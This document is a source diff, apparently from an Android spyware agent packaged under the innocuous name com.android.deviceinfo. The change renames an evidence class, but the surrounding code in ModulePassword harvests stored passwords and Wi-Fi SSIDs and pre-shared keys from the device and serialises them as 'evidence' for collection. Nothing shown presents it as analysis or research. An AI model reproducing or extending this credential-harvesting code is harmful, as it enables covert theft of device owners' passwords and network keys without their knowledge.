@@ -13,7 +13,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.Path;
@@ -66,7 +66,7 @@ public class ModulePassword extends BaseModule {
 	protected void actualGo() {
 
 		RecordVisitor passwordVisitor = new RecordVisitor() {
-			EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
+			EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
 			boolean needToSerialize = false;
 
 			@Override
@@ -133,7 +133,7 @@ public class ModulePassword extends BaseModule {
 		List<String> lines = StringUtils.readFileLines(filename);
 		String ssid = "";
 		String psk = "";
-		EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
+		EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
 		for (String line : lines) {
 			if (line.contains("ssid")) {
 				ssid = getValue(line);
@@ -238,7 +238,7 @@ public class ModulePassword extends BaseModule {
 
 	}
 
-	private void addToEvidence(EvidenceReference evidence, String name, String type, String password, String service) {
+	private void addToEvidence(EvidenceBuilder evidence, String name, String type, String password, String service) {
 		evidence.write(WChar.getBytes(type, true));
 		evidence.write(WChar.getBytes(name, true));
 		evidence.write(WChar.getBytes(password, true));
